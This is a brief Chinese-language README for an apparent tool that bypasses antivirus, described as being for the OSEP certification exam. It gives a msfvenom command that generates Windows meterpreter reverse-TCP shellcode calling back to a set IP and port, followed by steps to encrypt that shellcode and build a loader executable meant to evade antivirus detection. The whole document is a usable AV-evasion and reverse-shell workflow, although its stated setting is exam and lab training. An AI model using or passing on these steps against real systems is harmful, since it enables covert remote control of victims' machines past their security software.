# OSEP_Bypass_AV

## 简介

本项目主要用于 OSEP 考试中用来 bypass 杀软


```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.49.119 LPORT=8080 -f raw -o shellcode.bin
go build encrypter.go
encrypter.exe -i shellcode.bin
go build loader.go

loader.exe 就是 可执行程序

```
